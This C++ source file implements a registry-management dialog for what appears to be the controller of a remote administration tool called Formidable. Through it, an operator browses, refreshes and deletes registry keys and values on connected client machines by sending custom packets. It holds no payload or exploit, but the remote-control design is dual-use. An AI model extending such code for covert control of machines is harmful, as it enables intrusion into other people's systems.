#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
// RegistryDialog.cpp - 注册表管理对话框实现
#include "RegistryDialog.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include "../GlobalState.h"
#include "../Utils/StringHelper.h"
#include <CommCtrl.h>
#include <vector>
#include <map>
#include <mutex>

extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);

namespace Formidable {
namespace UI {

static std::map<HWND, uint32_t> s_dlgToClientId;

static std::string GetCurrentRegistryPath(HWND hTree, HTREEITEM hItem, uint32_t& outRootIdx) {
    std::vector<std::string> pathParts;
    outRootIdx = 0;
    
    HTREEITEM hCurrent = hItem;
    while (hCurrent) {
        TVITEMW tvi = { 0 };
        wchar_t text[256];
        tvi.mask = TVIF_TEXT | TVIF_PARAM;
        tvi.pszText = text;
        tvi.cchTextMax = 256;
        tvi.hItem = hCurrent;
        if (TreeView_GetItem(hTree, &tvi)) {
            HTREEITEM hParent = TreeView_GetParent(hTree, hCurrent);
            if (hParent == NULL) {
                outRootIdx = (uint32_t)tvi.lParam;
            } else {
                pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
            }
        }
        hCurrent = TreeView_GetParent(hTree, hCurrent);
    }
    
    std::reverse(pathParts.begin(), pathParts.end());
    std::string path = "";
    for (size_t i = 0; i < pathParts.size(); i++) {
        if (i > 0) path += "\\";
        path += pathParts[i];
    }
    return path;
}

static void SendRegistryRequest(HWND hDlg, uint32_t clientId, HTREEITEM hItem, uint32_t action) {
    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
    
    // 限制请求频率，防止快速连续点击导致的异常
    static DWORD lastRequestTime = 0;
    DWORD now = GetTickCount();
    if (now - lastRequestTime < 200) { // 200ms 间隔
        return;
    }
    lastRequestTime = now;

    // 构建完整路径
    uint32_t rootIdx = 0;
    std::string path = GetCurrentRegistryPath(hTree, hItem, rootIdx);
    
    // 如果路径中包含重复的部分（循环路径防御），可以通过 pathParts 检查，
    // 这里简单对 path 进行长度限制或简单的重复模式检查
    if (path.length() > 1024) return; 

    // 发送请求到服务端
    Formidable::CommandPkg pkg = { 0 };
    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
    pkg.arg1 = rootIdx; // 根键索引
    pkg.arg2 = action;  // 1=Keys, 2=Values
    
    size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
    memcpy(h->flag, "FRMD26?", 7);
    h->originLen = (int)bodySize;
    h->totalLen = (int)sendBuf.size();
    
    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
    
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (client) {
        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
    }
}

static void JumpToRegistryPath(HWND hDlg, const std::wstring& path) {
    if (path.empty()) return;

    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
    std::vector<std::wstring> parts;
    size_t start = 0, end = 0;
    while ((end = path.find(L'\\', start)) != std::wstring::npos) {
        parts.push_back(path.substr(start, end - start));
        start = end + 1;
    }
    parts.push_back(path.substr(start));

    if (parts.empty()) return;

    // 寻找根键
    HTREEITEM hCurrent = TreeView_GetRoot(hTree);
    HTREEITEM hFound = NULL;
    while (hCurrent) {
        wchar_t text[256];
        TVITEMW tvi = { 0 };
        tvi.mask = TVIF_TEXT;
        tvi.pszText = text;
        tvi.cchTextMax = 256;
        tvi.hItem = hCurrent;
        if (TreeView_GetItem(hTree, &tvi)) {
            if (_wcsicmp(text, parts[0].c_str()) == 0) {
                hFound = hCurrent;
                break;
            }
        }
        hCurrent = TreeView_GetNextSibling(hTree, hCurrent);
    }

    if (!hFound) return;

    // 逐级向下寻找
    for (size_t i = 1; i < parts.size(); i++) {
        // 确保已展开并加载
        TreeView_Expand(hTree, hFound, TVE_EXPAND);
        
        HTREEITEM hChild = TreeView_GetChild(hTree, hFound);
        HTREEITEM hNextFound = NULL;
        while (hChild) {
            wchar_t text[256];
            TVITEMW tvi = { 0 };
            tvi.mask = TVIF_TEXT;
            tvi.pszText = text;
            tvi.cchTextMax = 256;
            tvi.hItem = hChild;
            if (TreeView_GetItem(hTree, &tvi)) {
                if (_wcsicmp(text, parts[i].c_str()) == 0) {
                    hNextFound = hChild;
                    break;
                }
            }
            hChild = TreeView_GetNextSibling(hTree, hChild);
        }

        if (hNextFound) {
            hFound = hNextFound;
        } else {
            // 如果没找到，可能是还没从服务端加载。
            // 这种情况下很难直接跳转，因为是异步的。
            // 简单处理：停在当前已找到的最深处
            break;
        }
    }

    if (hFound) {
        TreeView_SelectItem(hTree, hFound);
        TreeView_EnsureVisible(hTree, hFound);
    }
}

static LRESULT CALLBACK RegistryPathEditSubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    if (uMsg == WM_KEYDOWN && wParam == VK_RETURN) {
        HWND hDlg = (HWND)dwRefData;
        wchar_t path[1024];
        GetWindowTextW(hWnd, path, 1024);
        JumpToRegistryPath(hDlg, path);
        return 0;
    }
    if (uMsg == WM_NCDESTROY) {
        RemoveWindowSubclass(hWnd, RegistryPathEditSubclassProc, uIdSubclass);
    }
    return DefSubclassProc(hWnd, uMsg, wParam, lParam);
}

INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_dlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_REGISTRY)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_REGISTRY)));
        
        HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES);
        HWND hPathEdit = GetDlgItem(hDlg, IDC_EDIT_REGISTRY_PATH);

        SetWindowSubclass(hPathEdit, RegistryPathEditSubclassProc, 0, (DWORD_PTR)hDlg);
        
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"名称"; lvc.cx = 150; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"类型"; lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"数据"; lvc.cx = 300; SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        
        // 添加根键
        TVINSERTSTRUCTW tvis = { 0 };
        tvis.hParent = TVI_ROOT;
        tvis.hInsertAfter = TVI_LAST;
        tvis.item.mask = TVIF_TEXT | TVIF_PARAM | TVIF_CHILDREN;
        tvis.item.cChildren = 1;
        
        tvis.item.pszText = (LPWSTR)L"HKEY_CLASSES_ROOT"; tvis.item.lParam = 0;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_CURRENT_USER"; tvis.item.lParam = 1;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_LOCAL_MACHINE"; tvis.item.lParam = 2;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_USERS"; tvis.item.lParam = 3;
        TreeView_InsertItem(hTree, &tvis);
        tvis.item.pszText = (LPWSTR)L"HKEY_CURRENT_CONFIG"; tvis.item.lParam = 4;
        TreeView_InsertItem(hTree, &tvis);
        
        // 等待模块加载完成（模块已由 MainWindow 发送）
        Sleep(100);
        ApplyModernTheme(hDlg);
        
        // 初始化 HKLM
        // 注意：这里手动发送请求，而不通过辅助函数，因为需要特殊处理？
        // 其实可以用辅助函数，但要先找到 HKEY_LOCAL_MACHINE 的 Item Handle。
        // 简单起见，这里不需要自动加载 HKLM，用户点击即可。
        // 或者保留原有逻辑：
        
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int pathHeight = 24;
        int treeWidth = rc.right / 4;
        if (treeWidth < 150) treeWidth = 150;

        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_REGISTRY_PATH), 0, 0, rc.right, pathHeight, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_TREE_REGISTRY), 0, pathHeight, treeWidth, rc.bottom - pathHeight, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES), treeWidth, pathHeight, rc.right - treeWidth, rc.bottom - pathHeight, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        // 树形控件事件
        if (nm->idFrom == IDC_TREE_REGISTRY) {
            if (nm->code == TVN_SELCHANGED) {
                LPNMTREEVIEW pnmtv = (LPNMTREEVIEW)lParam;
                if (pnmtv->itemNew.hItem) {
                    uint32_t clientId = s_dlgToClientId[hDlg];
                    
                    // 更新路径输入框
                    uint32_t rootIdx = 0;
                    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
                    std::string path = GetCurrentRegistryPath(hTree, pnmtv->itemNew.hItem, rootIdx);
                    
                    const char* rootKeys[] = { "HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };
                    std::string fullPathStr = rootKeys[rootIdx % 5];
                    if (!path.empty()) {
                        fullPathStr += "\\";
                        fullPathStr += path;
                    }
                    SetDlgItemTextW(hDlg, IDC_EDIT_REGISTRY_PATH, Utils::StringHelper::UTF8ToWide(fullPathStr).c_str());

                    // 1. 请求值
                    SendRegistryRequest(hDlg, clientId, pnmtv->itemNew.hItem, 2);
                    
                    // 2. 如果没有子节点，请求子键
                    if (TreeView_GetChild(hTree, pnmtv->itemNew.hItem) == NULL) {
                        SendRegistryRequest(hDlg, clientId, pnmtv->itemNew.hItem, 1);
                    }
                }
            } else if (nm->code == TVN_ITEMEXPANDING) {
                 LPNMTREEVIEW pnmtv = (LPNMTREEVIEW)lParam;
                 if (pnmtv->action == TVE_EXPAND) {
                     HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
                     if (TreeView_GetChild(hTree, pnmtv->itemNew.hItem) == NULL) {
                         // 如果没有子节点，说明还没加载，需要加载
                         // 必须先选中它，以便 CommandHandler 更新正确的节点
                         TreeView_SelectItem(hTree, pnmtv->itemNew.hItem);
                         // SelectItem 会触发 TVN_SELCHANGED，从而加载 Keys
                     }
                 }
            } else if (nm->code == NM_RCLICK) {
                // 树形控件右键菜单
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDM_REG_REFRESH, L"刷新(&R)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_REG_NEW_KEY, L"新建项(&N)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_DELETE, L"删除(&D)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_RENAME, L"重命名(&M)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_REG_COPY_PATH, L"复制路径(&C)");
                AppendMenuW(hMenu, MF_STRING, IDM_REG_EXPORT, L"导出(&E)");
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            }
        }
        // 列表控件右键菜单
        if (nm->idFrom == IDC_LIST_REGISTRY_VALUES && nm->code == NM_RCLICK) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            HMENU hNewMenu = CreatePopupMenu();
            
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 1, L"字符串值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 2, L"DWORD 值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 3, L"二进制值");
            AppendMenuW(hNewMenu, MF_STRING, IDM_REG_NEW_VALUE + 4, L"多字符串值");
            
            AppendMenuW(hMenu, MF_STRING, IDM_REG_REFRESH, L"刷新(&R)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hNewMenu, L"新建(&N)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_REG_MODIFY, L"修改(&M)");
            AppendMenuW(hMenu, MF_STRING, IDM_REG_DELETE, L"删除(&D)");
            AppendMenuW(hMenu, MF_STRING, IDM_REG_RENAME, L"重命名(&E)");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_REG_COPY_NAME, L"复制名称(&C)");
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        } else if (nm->idFrom == IDC_LIST_REGISTRY_VALUES && nm->code == LVN_COLUMNCLICK) {
            LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
            HWND hList = pnmlv->hdr.hwndFrom;

            if (!g_SortInfo.count(hList)) {
                g_SortInfo[hList] = { pnmlv->iSubItem, true, hList };
            }

            if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
            } else {
                g_SortInfo[hList].column = pnmlv->iSubItem;
                g_SortInfo[hList].ascending = true;
            }

            ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = s_dlgToClientId[hDlg];
        switch (LOWORD(wParam)) {
        case IDM_REG_REFRESH:
        {
            HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
            HTREEITEM hSelected = TreeView_GetSelection(hTree);
            if (hSelected) {
                // 强制刷新：同时请求子键和值
                SendRegistryRequest(hDlg, clientId, hSelected, 1);
                SendRegistryRequest(hDlg, clientId, hSelected, 2);
            }
            break;
        }
        case IDM_REG_DELETE:
        {
            HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
            HWND hList = GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES);
            
            // 检查是否在列表中选中了值
            int iSelected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (iSelected != -1) {
                if (MessageBoxW(hDlg, L"确定要删除选中的数值吗？", L"确认删除", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                    wchar_t valName[256];
                    ListView_GetItemText(hList, iSelected, 0, valName, 256);
                    
                    uint32_t rootIdx = 0;
                    std::string path = GetCurrentRegistryPath(hTree, TreeView_GetSelection(hTree), rootIdx);
                    
                    std::string fullData = path + "|" + Utils::StringHelper::WideToUTF8(valName);
                    
                    Formidable::CommandPkg pkg = { 0 };
                    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
                    pkg.arg1 = rootIdx;
                    pkg.arg2 = 4; // Delete Value
                    
                    size_t bodySize = sizeof(Formidable::CommandPkg) + fullData.size();
                    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)bodySize;
                    h->totalLen = (int)sendBuf.size();
                    
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), fullData.c_str(), fullData.size());
                    
                    std::shared_ptr<Formidable::ConnectedClient> client;
                    {
                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        if (g_Clients.count(clientId)) client = g_Clients[clientId];
                    }
                    if (client) SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                }
            } else {
                // 检查是否在树中选中了项
                HTREEITEM hSelected = TreeView_GetSelection(hTree);
                if (hSelected) {
                    TVITEMW tvi = { 0 };
                    tvi.hItem = hSelected;
                    tvi.mask = TVIF_PARAM;
                    TreeView_GetItem(hTree, &tvi);
                    
                    if (tvi.lParam >= 5) { // 不允许删除根键
                        if (MessageBoxW(hDlg, L"确定要删除选中的项及其所有子项吗？", L"确认删除", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                            uint32_t rootIdx = 0;
                            std::string path = GetCurrentRegistryPath(hTree, hSelected, rootIdx);

                            Formidable::CommandPkg pkg = { 0 };
                            pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
                            pkg.arg1 = rootIdx;
                            pkg.arg2 = 3; // Delete Key
                            
                            size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
                            std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                            Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                            memcpy(h->flag, "FRMD26?", 7);
                            h->originLen = (int)bodySize;
                            h->totalLen = (int)sendBuf.size();
                            
                            memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
                            memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
                            
                            std::shared_ptr<Formidable::ConnectedClient> client;
                            {
                                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                                if (g_Clients.count(clientId)) client = g_Clients[clientId];
                            }
                            if (client) SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
                        }
                    }
                }
            }
            break;
        }
        case IDCANCEL:
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (s_dlgToClientId.count(hDlg)) {
            uint32_t clientId = s_dlgToClientId[hDlg];
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) {
                g_Clients[clientId]->hRegistryDlg = NULL;
            }
            s_dlgToClientId.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

HWND RegistryDialog::Show(HWND hParent, uint32_t clientId) {
    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_REGISTRY), hParent, DlgProc, (LPARAM)clientId);
}

} // namespace UI
} // namespace Formidable
